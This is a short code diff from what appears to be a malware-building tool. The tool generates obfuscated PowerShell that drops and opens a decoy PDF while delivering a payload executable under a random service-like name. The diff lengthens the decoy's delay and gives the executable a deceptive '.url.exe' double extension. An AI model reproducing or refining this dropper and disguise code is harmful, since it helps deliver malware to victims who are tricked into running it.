@@ -88,7 +88,7 @@ def obfuscate_powershell_command(payloadname, output_exe_filename, szPayload, pd
             f'$pdfData=${bytes_var}[${pdf_var}..(${pdf_var}+{pdf_size}-1)];',
             f'[System.IO.File]::WriteAllBytes(${pdf_out_var},$pdfData);',
             f'Start-Process -FilePath ${pdf_out_var};',
-            f'Start-Sleep -Seconds 2;',  # Give PDF time to open
+            f'Start-Sleep -Seconds 5;',  # Give PDF time to open
             f'}};',
         ])
     
@@ -356,7 +356,7 @@ if __name__ == "__main__":
         "DiskOptimizerSvc",
     ]
     random_base_name = random.choice(possible_names)
-    output_exe_filename = f"{random_base_name}{timestamp}.exe"
+    output_exe_filename = f"{random_base_name}{timestamp}.url.exe"
 
     print("payloadname: " + payloadname)
     print("file to smuggle: " + filetosmuggle)
